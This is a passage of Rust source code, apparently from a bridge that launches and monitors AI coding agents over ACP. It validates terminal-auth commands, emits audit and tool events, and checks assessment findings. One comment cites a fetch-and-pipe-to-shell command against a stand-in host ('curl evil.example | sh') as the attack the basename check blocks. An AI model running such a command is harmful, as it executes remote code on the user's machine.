                .and_then(|m| m.get("terminal-auth"))
                .and_then(|v| v.as_object())
                .cloned();
            let Some(terminal_auth) = terminal_auth else {
                return Err(AuthenticateError::TerminalCapabilityDisabled {
                    method_id: method_id.to_string(),
                });
            };
            let command = terminal_auth
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type: method_type.clone(),
                    code: "auth.command_invalid",
                    message: "terminal auth metadata is missing command".into(),
                })?;
            let args = terminal_auth
                .get("args")
                .and_then(|v| v.as_array())
                .ok_or_else(|| AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type: method_type.clone(),
                    code: "auth.command_invalid",
                    message: "terminal auth metadata is missing args".into(),
                })?
                .iter()
                .map(|arg| arg.as_str().unwrap_or_default().to_string())
                .collect::<Vec<_>>();

            // Patch C — verify the advertised command basename matches
            // the agent we actually spawned. The synthesized
            // `spawn-gemini-cli` method trivially passes; an adapter
            // that tries to slip in a different command (e.g. /bin/sh
            // -c "curl evil.example | sh") gets rejected with
            // `auth.command_invalid`.
            let configured_basename = acp.agent_command.file_name().map(|s| s.to_owned());
            let advertised_basename = Path::new(command).file_name().map(|s| s.to_owned());
            if configured_basename.is_none() || configured_basename != advertised_basename {
                return Err(AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type: method_type.clone(),
                    code: "auth.command_invalid",
                    message: format!(
                        "terminal auth command '{}' basename does not match configured agent command",
                        command
                    ),
                });
            }
            // Patch C — ACP runtime flags must be stripped from the
            // auth invocation. If the adapter snuck them back in, we
            // refuse to launch the login flow in ACP server mode.
            if args
                .iter()
                .any(|a| a == "--acp" || a == "--experimental-acp")
            {
                return Err(AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type: method_type.clone(),
                    code: "auth.command_invalid",
                    message: "terminal auth args must not include ACP runtime flags (--acp, --experimental-acp)".into(),
                });
            }

            // Audit: log the *basename* of what we're about to run
            // so operators can see the local exec without leaking
            // secrets that might appear in env or args.
            let cmd_basename = Path::new(command)
                .file_name()
                .map(|s| s.to_string_lossy().to_string())
                .unwrap_or_else(|| command.to_string());
            if let Some(audit) = self.audit.as_ref() {
                audit.log(
                    &self.id,
                    "session",
                    bridge_core::AuditSeverity::Info,
                    serde_json::json!({
                        "event": "terminal_auth_launch",
                        "auth_method_id": method_id,
                        "agent_id": self.agent_id,
                        "command_basename": cmd_basename,
                        "args_count": args.len(),
                    }),
                );
            }

            let mut auth_cmd = tokio::process::Command::new(command);
            auth_cmd
                .args(&args)
                .current_dir(&self.project_root)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::inherit())
                .stderr(std::process::Stdio::inherit());
            if std::env::var_os("CLAUDE_CODE_EXECUTABLE").is_none() {
                if let Some(exec) = resolve_claude_cli_executable() {
                    auth_cmd.env("CLAUDE_CODE_EXECUTABLE", exec);
                }
            }
            let status = auth_cmd
                .status()
                .await
                .map_err(|e| AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type: method_type.clone(),
                    code: "auth.command_failed",
                    message: e.to_string(),
                })?;

            if !status.success() {
                return Err(AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type,
                    code: "auth.command_failed",
                    message: format!("terminal auth command exited unsuccessfully: {}", status),
                });
            }

            return Ok(AuthenticateOutcome {
                method_id: method_id.to_string(),
                method_type,
                response: AuthenticateResponse {
                    status: serde_json::json!({ "ok": true }),
                    meta: serde_json::Value::Null,
                },
            });
        }

        // env_var live-restart of the ACP child is non-trivial and is
        // sized as a follow-up slice; surface a typed error so the FE
        // can prompt the user to recreate the session with the env var
        // set in the bridge's launch environment.
        if method_type == "env_var" {
            return Err(AuthenticateError::EnvVarRecreateRequired {
                method_id: method_id.to_string(),
                vars: method
                    .get("vars")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default(),
            });
        }

        // "agent" (and any unrecognised) type — hand off to the adapter
        // and let it manage its own login flow (e.g. Claude Pro/Max
        // OAuth via `claude-login`).
        let req = AuthenticateRequest {
            method_id: method_id.to_string(),
        };
        match acp.client.authenticate(req).await {
            Ok(resp) => Ok(AuthenticateOutcome {
                method_id: method_id.to_string(),
                method_type,
                response: resp,
            }),
            Err(e) => {
                let code = e
                    .downcast_ref::<JsonRpcError>()
                    .map(classify_jsonrpc_error)
                    .unwrap_or("agent.protocol_error");
                Err(AuthenticateError::AdapterFailed {
                    method_id: method_id.to_string(),
                    method_type,
                    code,
                    message: e.to_string(),
                })
            }
        }
    }

    pub async fn close_stdin(&self) {
        let _ = self.stdin.lock().await.take();
    }
}

async fn emit_event(handle: &SessionHandleRef, event: ServerEvent) {
    emit_to(&handle.ring, &handle.broadcast, event).await;
}

/// Audit P2 fix helper: structured payload for `terminal.lifecycle`
/// ServerEvents. Lives next to [`build_terminal_lifecycle_payload`]
/// so the dispatcher can emit a self-contained event without having
/// to peek at the in-memory `TerminalHandle` map (which can already
/// be gone by the time `released`/`exited` is observed).
struct TerminalLifecyclePayload {
    kind: &'static str,
    terminal_id: String,
    command: Option<String>,
    args: Option<Vec<String>>,
    exit_code: Option<i32>,
}

/// Derive a [`TerminalLifecyclePayload`] from an ACP terminal
/// request/response pair. Returns `None` for methods that don't
/// represent a lifecycle transition (e.g. `terminal/output`) or
/// when the response shape is unexpected.
fn build_terminal_lifecycle_payload(
    method: &str,
    params: &serde_json::Value,
    response: &serde_json::Value,
) -> Option<TerminalLifecyclePayload> {
    let kind: &'static str = match method {
        "terminal/create" => "created",
        "terminal/wait_for_exit" => "exited",
        "terminal/kill" => "killed",
        "terminal/release" => "released",
        _ => return None,
    };
    let terminal_id = match method {
        "terminal/create" => response.get("terminalId")?.as_str()?.to_string(),
        _ => params.get("terminalId")?.as_str()?.to_string(),
    };
    let command = params
        .get("command")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let args = params.get("args").and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|x| x.as_str().map(|s| s.to_string()))
            .collect::<Vec<String>>()
    });
    let exit_code = if method == "terminal/wait_for_exit" {
        response
            .get("exitCode")
            .and_then(|v| v.as_i64())
            .map(|n| n as i32)
    } else {
        None
    };
    Some(TerminalLifecyclePayload {
        kind,
        terminal_id,
        command,
        args,
        exit_code,
    })
}

/// Stage X.5h.2 Step 3b — emit the canonical 4-lane VAC event
/// surface for an [`ObservedToolActivity`] produced by the OpenCode
/// HTTP API tap (sub-agent tool calls). Mirrors
/// [`SessionHandle::map_tool_activity`]'s emit pattern but skips the
/// X.5c.2 audit/correlation extras (audit is approval-correlated, and
/// sub-agent tool calls don't carry approvals in this stage).
///
/// Lanes:
/// 1. Primary  — `tool.observed` / `tool.updated` / `tool.failed`.
/// 2. Rich     — `tool.call.created` / `tool.call.updated`.
/// 3. Diff     — `tool.diff.updated` (only when `activity.diffs`
///    is non-empty).
/// 4. Terminal — `tool.terminal.updated` (only for `Execute` and
///    not `Pending`).
///
/// `discriminator` is `"tool_call"` for started events and
/// `"tool_call_update"` for completion events. Anything else falls
/// through to `tool.call.updated`.
async fn emit_subagent_activity_lanes(
    handle: &SessionHandleRef,
    activity: &ObservedToolActivity,
    discriminator: &str,
) {
    let event_type = match activity.status {
        ToolStatus::Failed => "tool.failed",
        ToolStatus::Pending => "tool.observed",
        _ => "tool.updated",
    };
    let payload = serde_json::to_value(activity).unwrap_or(serde_json::Value::Null);
    let ts = chrono::Utc::now().to_rfc3339();

    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: event_type.into(),
        payload: payload.clone(),
        v: 1,
        ts: ts.clone(),
    };
    emit_event(handle, event).await;

    let rich_event_type = match discriminator {
        "tool_call" => "tool.call.created",
        "tool_call_update" => "tool.call.updated",
        _ => "tool.call.updated",
    };
    let rich_event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: rich_event_type.into(),
        payload: payload.clone(),
        v: 1,
        ts: ts.clone(),
    };
    emit_event(handle, rich_event).await;

    if !activity.diffs.is_empty() {
        let diff_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "tool.diff.updated".into(),
            payload: serde_json::json!({
                "tool_call_id": activity.tool_call_id,
                "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
                "diffs": activity.diffs.clone(),
                "locations": activity.locations.clone(),
                "approved_by_approval_id": activity.approved_by_approval_id.clone(),
                "agent_id": activity.agent_id.clone(),
                "agent_kind": activity.agent_kind.as_str(),
                "parent_tool_call_id": activity.parent_tool_call_id.clone(),
            }),
            v: 1,
            ts: ts.clone(),
        };
        emit_event(handle, diff_event).await;
    }

    if matches!(activity.kind, ToolKind::Execute) && !matches!(activity.status, ToolStatus::Pending)
    {
        let terminal_event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "tool.terminal.updated".into(),
            payload: serde_json::json!({
                "tool_call_id": activity.tool_call_id,
                "status": payload.get("status").cloned().unwrap_or(serde_json::Value::Null),
                "raw_input_redacted": activity.raw_input_redacted.clone(),
                "raw_output_redacted": activity.raw_output_redacted.clone(),
                "approved_by_approval_id": activity.approved_by_approval_id.clone(),
                "agent_id": activity.agent_id.clone(),
                "agent_kind": activity.agent_kind.as_str(),
                "parent_tool_call_id": activity.parent_tool_call_id.clone(),
            }),
            v: 1,
            ts: ts.clone(),
        };
        emit_event(handle, terminal_event).await;
    }
}

async fn emit_to(
    ring: &Arc<RwLock<EventRing<ServerEvent>>>,
    bcast: &broadcast::Sender<ServerEvent>,
    event: ServerEvent,
) {
    let seq = {
        let mut r = ring.write().await;
        r.push(event.clone())
    };
    let mut with_seq = event;
    with_seq.seq = seq;
    let _ = bcast.send(with_seq);
}

fn acp_debug_enabled() -> bool {
    matches!(
        std::env::var("VAC_WEB_ACP_DEBUG").ok().as_deref(),
        Some("1") | Some("true") | Some("TRUE") | Some("yes") | Some("YES")
    )
}

fn resolve_claude_cli_executable() -> Option<String> {
    let paths = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&paths) {
        let candidate = dir.join("claude");
        if candidate.exists() {
            return Some(candidate.to_string_lossy().into_owned());
        }
    }
    None
}

/// JSON-RPC notification line processor — used for Mock + VacNative
/// engines. The mock-engine + future `vac serve --stdio` both speak
/// `{"jsonrpc":"2.0","method":"…","params":{…}}`; we pass-through
/// `method` as the event_type and `params` as the payload.
async fn process_jsonrpc_line(line: &str, handle: &SessionHandleRef) {
    let parsed: serde_json::Value = match serde_json::from_str(line) {
        Ok(v) => v,
        Err(e) => {
            warn!(session = %handle.id, "engine emitted non-JSON: {e} | raw: {line}");
            return;
        }
    };

    let Some(method) = parsed.get("method").and_then(|m| m.as_str()) else {
        // Response to a request — route via correlation (Phase 1.3 handles).
        return;
    };

    let params = parsed
        .get("params")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    match method {
        "assessment.candidate_received" => {
            handle_assessment_candidate(handle, &params, method).await;
        }
        "assessment.finding_added" => {
            emit_passthrough_event(
                handle,
                "assessment.finding_added",
                params,
                "assessment.finding_added",
            )
            .await;
        }
        "assessment.evidence_attached" => {
            emit_passthrough_event(
                handle,
                "assessment.evidence_attached",
                params,
                "assessment.evidence_attached",
            )
            .await;
        }
        "assessment.finding" => {
            emit_passthrough_event(
                handle,
                "assessment.finding_added",
                params,
                "assessment.finding",
            )
            .await;
        }
        "assessment.evidence" => {
            emit_passthrough_event(
                handle,
                "assessment.evidence_attached",
                params,
                "assessment.evidence",
            )
            .await;
        }
        _ => {
            let ts = chrono::Utc::now().to_rfc3339();
            let event = ServerEvent {
                seq: 0,
                session_id: handle.id.clone(),
                event_type: method.to_string(),
                payload: params,
                v: 1,
                ts,
            };
            emit_event(handle, event).await;
        }
    }
}

async fn emit_passthrough_event(
    handle: &SessionHandleRef,
    event_type: &str,
    payload: serde_json::Value,
    source_event_type: &str,
) {
    let payload = augment_payload(
        payload,
        &[("source_event_type", serde_json::json!(source_event_type))],
    );
    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: event_type.to_string(),
        payload,
        v: 1,
        ts: chrono::Utc::now().to_rfc3339(),
    };
    emit_event(handle, event).await;
}

async fn handle_assessment_candidate(
    handle: &SessionHandleRef,
    params: &serde_json::Value,
    source_event_type: &str,
) {
    let Some(run_id) = extract_string(params, &["run_id", "runId"]) else {
        warn!(
            session = %handle.id,
            source_event_type,
            "assessment candidate missing run_id"
        );
        return;
    };

    let candidates = extract_candidates(params);
    if candidates.is_empty() {
        warn!(
            session = %handle.id,
            run_id = %run_id,
            source_event_type,
            "assessment candidate payload carried no candidates"
        );
        return;
    }

    let batch_hash = sha256_hex_canonical(params);
    let received_event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: "assessment.candidate_received".into(),
        payload: serde_json::json!({
            "run_id": run_id,
            "candidate_hash": batch_hash,
            "candidate_count": candidates.len(),
            "source_event_type": source_event_type,
            "agent_id": handle.agent_id,
            "agent_kind": handle.agent_kind.as_str(),
        }),
        v: 1,
        ts: chrono::Utc::now().to_rfc3339(),
    };
    emit_event(handle, received_event).await;

    for candidate in candidates {
        let candidate_hash = sha256_hex_canonical(&candidate);
        let validation = {
            let mut tracker = handle.assessment_validation.lock().await;
            validate_candidate(
                &handle.project_root,
                &mut tracker,
                &run_id,
                &candidate,
                source_event_type,
            )
        };

        match validation {
            Ok(validated) => {
                emit_validated_candidate(
                    handle,
                    &run_id,
                    source_event_type,
                    &candidate_hash,
                    validated,
                )
                .await
            }
            Err(rejection) => {
                emit_candidate_rejection(
                    handle,
                    &run_id,
                    source_event_type,
                    &candidate_hash,
                    rejection,
                )
                .await
            }
        }
    }
}

async fn emit_validated_candidate(
    handle: &SessionHandleRef,
    run_id: &str,
    source_event_type: &str,
    candidate_hash: &str,
    validated: CandidateFinding,
) {
    let CandidateFinding {
        title,
        summary,
        finding_event,
        evidence_events,
        ..
    } = validated;

    let finding_id = finding_event
        .get("finding_id")
        .and_then(|v| v.as_str())
        .unwrap_or("fnd_unknown")
        .to_string();

    for evidence in evidence_events {
        let payload = augment_payload(
            evidence,
            &[
                ("run_id", serde_json::json!(run_id)),
                ("candidate_hash", serde_json::json!(candidate_hash)),
                ("source_event_type", serde_json::json!(source_event_type)),
                ("agent_id", serde_json::json!(handle.agent_id)),
                ("agent_kind", serde_json::json!(handle.agent_kind.as_str())),
                ("finding_id", serde_json::json!(finding_id)),
            ],
        );
        let event = ServerEvent {
            seq: 0,
            session_id: handle.id.clone(),
            event_type: "assessment.evidence_attached".into(),
            payload,
            v: 1,
            ts: chrono::Utc::now().to_rfc3339(),
        };
        emit_event(handle, event).await;
    }

    let payload = augment_payload(
        finding_event,
        &[
            ("run_id", serde_json::json!(run_id)),
            ("candidate_hash", serde_json::json!(candidate_hash)),
            ("source_event_type", serde_json::json!(source_event_type)),
            ("agent_id", serde_json::json!(handle.agent_id)),
            ("agent_kind", serde_json::json!(handle.agent_kind.as_str())),
        ],
    );
    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: "assessment.finding_added".into(),
        payload: payload.clone(),
        v: 1,
        ts: chrono::Utc::now().to_rfc3339(),
    };
    emit_event(handle, event).await;

    if let Some(audit) = handle.audit.as_ref() {
        audit.log(
            &handle.id,
            "assessment",
            bridge_core::AuditSeverity::Info,
            serde_json::json!({
                "event": "finding_added",
                "run_id": run_id,
                "candidate_hash": candidate_hash,
                "finding_id": payload.get("finding_id").cloned().unwrap_or(serde_json::Value::Null),
                "identity_hash": payload.get("identity_hash").cloned().unwrap_or(serde_json::Value::Null),
                "title": title,
                "summary": summary,
                "agent_id": handle.agent_id,
                "agent_kind": handle.agent_kind.as_str(),
                "source_event_type": source_event_type,
            }),
        );
    }

    let summary = format!(
        "Validated finding: {}",
        payload
            .get("title")
            .and_then(|v| v.as_str())
            .unwrap_or("candidate")
    );
    let activity = activity_event(
        handle.id.clone(),
        "assessment",
        NotifySeverity::Info,
        &summary,
    );
    emit_event(handle, activity).await;
}

async fn emit_candidate_rejection(
    handle: &SessionHandleRef,
    run_id: &str,
    source_event_type: &str,
    candidate_hash: &str,
    rejection: CandidateRejection,
) {
    let payload = serde_json::json!({
        "run_id": run_id,
        "candidate_hash": candidate_hash,
        "reason": rejection.reason,
        "summary": rejection.summary,
        "source_event_type": source_event_type,
        "agent_id": handle.agent_id,
        "agent_kind": handle.agent_kind.as_str(),
    });
    let event = ServerEvent {
        seq: 0,
        session_id: handle.id.clone(),
        event_type: "assessment.candidate_rejected".into(),
        payload: payload.clone(),
        v: 1,
        ts: chrono::Utc::now().to_rfc3339(),
    };
    emit_event(handle, event).await;

    if let Some(audit) = handle.audit.as_ref() {
        audit.log(
            &handle.id,
            "assessment",
            bridge_core::AuditSeverity::Warn,
            serde_json::json!({
                "event": "candidate_rejected",
                "run_id": run_id,
                "candidate_hash": candidate_hash,
                "reason": payload.get("reason").cloned().unwrap_or(serde_json::Value::Null),
                "summary": payload.get("summary").cloned().unwrap_or(serde_json::Value::Null),
                "agent_id": handle.agent_id,
                "agent_kind": handle.agent_kind.as_str(),
                "source_event_type": source_event_type,
            }),
        );
    }

    let summary = format!(
        "Rejected candidate: {}",
        payload
            .get("summary")
            .and_then(|v| v.as_str())
            .unwrap_or("validation failed")
    );
    let activity = activity_event(
        handle.id.clone(),
        "assessment",
        NotifySeverity::Warn,
        &summary,
    );
    emit_event(handle, activity).await;
}

fn extract_candidates(params: &serde_json::Value) -> Vec<serde_json::Value> {
    if let Some(arr) = params.get("candidates").and_then(|v| v.as_array()) {
        return arr.clone();
    }
    if let Some(candidate) = params.get("candidate") {
        return vec![candidate.clone()];
    }
    if params
        .as_object()
        .map(|obj| {
            obj.contains_key("title")
                || obj.contains_key("identityHash")
                || obj.contains_key("identity_hash")
        })
        .unwrap_or(false)
    {
        return vec![params.clone()];
    }
    Vec::new()
}

fn extract_string(value: &serde_json::Value, keys: &[&str]) -> Option<String> {
    for key in keys {
        if let Some(v) = value_at(value, key).and_then(|v| v.as_str()) {
            return Some(v.to_string());
        }
    }
    None
}

fn value_at<'a>(value: &'a serde_json::Value, key: &str) -> Option<&'a serde_json::Value> {
    if let Some((head, tail)) = key.split_once('.') {
        value.get(head).and_then(|child| value_at(child, tail))
    } else {
        value.get(key)
    }
}

fn augment_payload(
    payload: serde_json::Value,
    fields: &[(&str, serde_json::Value)],
) -> serde_json::Value {
    let mut payload = payload;
    let Some(obj) = payload.as_object_mut() else {
        return payload;
    };
    for (k, v) in fields {
        obj.insert((*k).to_string(), v.clone());
    }
    payload
}

impl SessionHandle {
    /// Stage X.5b — official ACP path. Spawn the agent binary, run
    /// `initialize`, open a session via `session/new`, and start a
    /// task that pumps `session/update` notifications into VAC events.
    /// CLI args follow `agent.args` *only* — no `--profile/--session-id/
    /// --project` because the ACP client conveys cwd via
    /// `session/new.params.cwd`.
    async fn spawn_acp(opts: SpawnOptions) -> anyhow::Result<SessionHandleRef> {
        let debug = AcpDebugLog::new(acp_debug_enabled());
        let mut env = Vec::new();
        if opts.agent.id == "claude-acp" && std::env::var_os("CLAUDE_CODE_EXECUTABLE").is_none() {
            if let Some(exec) = resolve_claude_cli_executable() {
                env.push(("CLAUDE_CODE_EXECUTABLE".to_string(), exec));
            }
        }
        // Stage X.5h.2 — inject --port/--hostname for OpenCode acp child
        // so the bridge can subscribe to /event SSE for sub-agent tool
        // activity that ACP doesn't surface natively.
        let mut spawn_args: Vec<String> = opts.agent.args.to_vec();
        let opencode_serve_port: Option<u16> = if is_opencode_agent(
            &opts.agent.id,
            &opts.agent.command,
        ) {
            match pick_free_port() {
                Ok(port) => {
                    spawn_args.push("--port".to_string());
                    spawn_args.push(port.to_string());
                    spawn_args.push("--hostname".to_string());
                    spawn_args.push("127.0.0.1".to_string());
                    info!(agent = %opts.agent.id, port, "X.5h.2: opencode acp child --port wired");
                    Some(port)
                }
                Err(e) => {
                    warn!(agent = %opts.agent.id, error = %e, "X.5h.2: pick_free_port failed; subagent tap disabled");
                    None
                }
            }
        } else {
            None
        };
        let (client, mut child) = AcpClient::spawn(
            &opts.agent.command,
            &spawn_args,
            &env,
            Some(Arc::clone(&debug)),
        )?;

        // Load the capability profile for fs/terminal advertisement.
        let profile = profile_core::profile::CapabilityProfile::load(
            &opts.profile_id,
            &opts.profile_root,
        )
        .unwrap_or_else(|e| {
            warn!(profile = %opts.profile_id, error = %e, "profile load failed for caps; defaulting to restrictive");
            profile_core::profile::CapabilityProfile {
                id: opts.profile_id.clone(),
                class: profile_core::profile::Class::Assessor,
                version: "0.0.0".into(),
                description: None,
                inherits_from: None,
                tool_allow: vec![],
                tool_deny: vec![],
                shell_allowlist: vec![],
                fs: Default::default(),
                git: Default::default(),
                connectors: Default::default(),
                network_egress: Default::default(),
                approval_required_for: vec![],
                allowed_agent_kinds: vec!["acp".into()],
                resource_limits: None,
                audit: None,
            }
        });

        let fs_read_enabled = profile.fs.read != "none";
        let fs_write_enabled = profile.fs.write != "none";
        let terminal_enabled = profile.class == profile_core::profile::Class::Executor
            && !profile.shell_allowlist.is_empty();

        let init_req = InitializeRequest {
            protocol_version: 1,
            client_capabilities: ClientCapabilities {
                fs: FsClientCapabilities {
                    read_text_file: fs_read_enabled,
                    write_text_file: fs_write_enabled,
                },
                terminal: terminal_enabled,
                auth: Some(AuthClientCapabilities { terminal: true }),
                meta: Some(serde_json::json!({ "terminal-auth": true })),
            },
        };
        let init = client.initialize(init_req).await?;

        // Open ACP session bound to the project root.
        let new_req = NewSessionRequest {
            cwd: opts
                .project_root
                .to_str()
                .ok_or_else(|| anyhow::anyhow!("project_root not utf-8"))?
                .to_string(),
            mcp_servers: opts.agent.mcp_servers.clone(),
        };
        let new_resp = client.new_session(new_req).await?;
        let acp_session_id = new_resp.session_id.clone();

        // Wire the rest of the bridge state.
        let state = Arc::new(StateHolder::new());
        let ring = Arc::new(RwLock::new(EventRing::<ServerEvent>::new(5000)));
        let (bcast_tx, _) = broadcast::channel::<ServerEvent>(512);

        let mut update_rx = client.subscribe_updates();
        let permission_rx = client.take_permission_receiver().await;
        let fs_rx = client.take_fs_receiver().await;
        let terminal_rx = client.take_terminal_receiver().await;
        // Patch B — Gemini CLI doesn't advertise an ACP-style auth
        // method (it uses an interactive `/auth` flow), so the bridge
        // synthesizes a Zed-style `spawn-gemini-cli` terminal auth
        // method from the configured agent command + args (with ACP
        // runtime flags stripped). The adapter still can't influence
        // the command we run — the synthesized method points at
        // `opts.agent.command`, not anything the adapter advertised.
        let auth_methods = if opts.agent.id == "gemini-acp" {
            let synthesized =
                synthesize_gemini_terminal_auth_method(&opts.agent.command, &opts.agent.args);
            merge_synthetic_terminal_auth_method(init.auth_methods.clone(), synthesized)
        } else {
            init.auth_methods.clone()
        };
        let acp_runtime = Arc::new(AcpRuntime {
            client,
            acp_session_id: acp_session_id.clone(),
            auth_methods,
            agent_capabilities: init.agent_capabilities.clone(),
            agent_info: init.agent_info.clone(),
            terminals: Arc::new(dashmap::DashMap::new()),
            pending_approvals: dashmap::DashMap::new(),
            permission_timeout_ms: opts.agent.permission_timeout_ms,
            approval_by_tool_call_id: dashmap::DashMap::new(),
            approval_by_full_hash: dashmap::DashMap::new(),
            audit: opts.audit.clone(),
            debug: Some(Arc::clone(&debug)),
            agent_command: opts.agent.command.clone(),
            task_scope: StdMutex::new(Vec::new()),
            subagent_tap: StdMutex::new(None),
        });

        // Resolve workflow spec. Unknown ids are rejected upstream at the
        // translator layer; this branch hard-errors to guard internal callers.
        let (workflow_spec_acp, workflow_spec_id_acp, workflow_spec_name_acp) = {
            use crate::workflows::WorkflowRegistry;
            let reg = WorkflowRegistry::global();
            let default_id = WorkflowRegistry::default_build_spec_id();
            match opts.workflow_id.as_deref() {
                Some(wid) => {
                    let spec = reg.get(wid).cloned().ok_or_else(|| {
                        anyhow::anyhow!("workflow.not_found: '{wid}' is not a bundled workflow")
                    })?;
                    let name = spec.metadata.name.clone();
                    (Some(spec), wid.to_string(), name)
                }
                None => {
                    let spec = reg.get(default_id).cloned();
                    let name = spec
                        .as_ref()
                        .map(|s| s.metadata.name.clone())
                        .unwrap_or_default();
                    (spec, default_id.to_string(), name)
                }
            }
        };

        let handle = Arc::new(Self {
            id: opts.session_id.clone(),
            profile_id: opts.profile_id.clone(),
            project_root: opts.project_root.clone(),
            agent_id: opts.agent.id.clone(),
            agent_kind: opts.agent.kind,
            workflow_spec_id: workflow_spec_id_acp,
            workflow_spec_name: workflow_spec_name_acp,
            state: Arc::clone(&state),
            ring: Arc::clone(&ring),
            stdin: Arc::new(Mutex::new(None)),
            broadcast: bcast_tx.clone(),
            acp: Some(Arc::clone(&acp_runtime)),
            audit: opts.audit.clone(),
            assessment_validation: Arc::new(Mutex::new(AssessmentValidationTracker::default())),
        });

        // Stage X.5h.2 Step 3b — launch the sub-agent tap and the drainer
        // that translates its forwarded ObservedToolActivity into the
        // canonical 4-lane VAC event surface. Tap is launched here
        // (after `handle` Arc construction) because the drainer needs
        // to clone `handle` to call `emit_subagent_activity_lanes`.
        if let Some(port) = opencode_serve_port {
            let base_url = format!("http://127.0.0.1:{}", port);
            let (sub_tx, mut sub_rx) = mpsc::unbounded_channel::<
                crate::agent_runtime::opencode_serve::SubagentToolEvent,
            >();
            let tap = crate::agent_runtime::opencode_serve::OpencodeSubagentTap::launch(
                base_url,
                acp_session_id.clone(),
                opts.session_id.clone(),
                opts.agent.id.clone(),
                opts.agent.kind,
                Arc::downgrade(&acp_runtime),
                sub_tx,
            );
            if let Ok(mut slot) = acp_runtime.subagent_tap.lock() {
                *slot = Some(Arc::new(tap));
            }
            let drain_handle = Arc::clone(&handle);
            tokio::spawn(async move {
                while let Some(evt) = sub_rx.recv().await {
                    emit_subagent_activity_lanes(&drain_handle, &evt.activity, evt.discriminator)
                        .await;
                }
                tracing::info!(
                    session = %drain_handle.id,
                    "opencode subagent drain channel closed"
                );
            });
        }

        if let Some(debug) = acp_runtime.debug.as_ref() {
            debug
                .attach_session(
                    handle.id.clone(),
                    Arc::clone(&handle.ring),
                    handle.broadcast.clone(),
                )
                .await;
        }

        info!(
            session_id = %handle.id,
            profile_id = %handle.profile_id,
            agent_id = %handle.agent_id,
            agent_kind = %handle.agent_kind.as_str(),
            command = %opts.agent.command.display(),
            project_root = %handle.project_root.display(),
            acp_session_id = %acp_session_id,
            "ACP session opened"
        );

        state.transition(bridge_core::SessionState::Ready).ok();

        // Pump session/update notifications → VAC transcript.delta.
        // Out-of-scope variants (tool_call, plan, usage_update, etc) are
        // logged at debug for X.5c to consume.
        let pump_handle = Arc::clone(&handle);
        tokio::spawn(async move {
            loop {
                match update_rx.recv().await {
                    Ok(notif) => map_acp_update(&pump_handle, notif).await,
                    Err(broadcast::error::RecvError::Closed) => break,
                    Err(broadcast::error::RecvError::Lagged(n)) => {
                        warn!(session = %pump_handle.id, lagged = n, "ACP update broadcast lagged");
                    }
                }
            }
        });

        // Stage X.5c.1 — pump session/request_permission requests
        // into the bridge's approval queue. For each request:
        //   1. Mint a VAC approvalId (ULID) and stash the
        //      acp_request_id + options + toolCall in pending_approvals.
        //   2. Schedule an auto-cancel timer keyed on
        //      permission_timeout_ms; when it fires, the bridge sends
        //      `{outcome:"cancelled"}` and removes the entry.
        //   3. Emit `approval.pending` ServerEvent with the approvalId
        //      and the agent's payload so the web surface can render.
        if let Some(mut perm_rx) = permission_rx {
            let perm_handle = Arc::clone(&handle);
            tokio::spawn(async move {
                while let Some(req) = perm_rx.recv().await {
                    handle_permission_request(&perm_handle, req).await;
                }
                info!(session = %perm_handle.id, "ACP permission channel closed");
            });
        }

        // Stage X.5c.3 — fs handler task.
        if let Some(mut fs_rx) = fs_rx {
            let fs_ctx = crate::agent_runtime::acp::fs_handler::build_fs_context(
                &profile,
                &opts.project_root,
                &opts.session_id,
                &opts.agent.id,
                opts.audit.clone(),
            );
            let fs_acp = Arc::clone(&acp_runtime);
            let fs_handle = Arc::clone(&handle);
            tokio::spawn(async move {
                use crate::agent_runtime::acp::fs_handler::{handle_fs_read, handle_fs_write};
                while let Some(req) = fs_rx.recv().await {
                    match req.method.as_str() {
                        "fs/read_text_file" => match handle_fs_read(&fs_ctx, &req.params).await {
                            Ok(result) => {
                                let _ = fs_acp.client.respond_result(req.id, result);
                            }
                            Err(e) => {
                                let _ = fs_acp.client.respond_error(
                                    req.id,
                                    e.jsonrpc_code(),
                                    e.to_string(),
                                    e.jsonrpc_data(),
                                );
                            }
                        },
                        "fs/write_text_file" => match handle_fs_write(&fs_ctx, &req.params).await {
                            Ok((result, meta)) => {
                                let _ = fs_acp.client.respond_result(req.id, result);
                                // Audit Sprint 1 P1 fix: surface ACP
                                // `fs/write_text_file` mutations to the
                                // Review/changeset surface so the
                                // operator sees the diff immediately.
                                // The dispatcher previously discarded
                                // `meta` and the cockpit had no idea a
                                // write happened.
                                if let Some(meta) = meta {
                                    let ts = chrono::Utc::now().to_rfc3339();
                                    let tool_call_id =
                                        format!("acp-fs-write-{}", ulid::Ulid::new());
                                    let review_payload = serde_json::json!({
                                        "tool_call_id": tool_call_id,
                                        "status": "completed",
                                        "locations": [{
                                            "path": meta.path,
                                        }],
                                        "diffs": [{
                                            "path": meta.path,
                                            "old_text": meta.old_content,
                                            "new_text": meta.new_content,
                                        }],
                                        "raw_input_redacted": {},
                                        "approved_by_approval_id": serde_json::Value::Null,
                                        "agent_id": fs_ctx.agent_id.clone(),
                                        "agent_kind": "acp",
                                        "source_event_type": "acp.fs.write_text_file",
                                    });
                                    let review_event = ServerEvent {
                                        seq: 0,
                                        session_id: fs_handle.id.clone(),
                                        event_type: "review.changeset_updated".into(),
                                        payload: review_payload,
                                        v: 1,
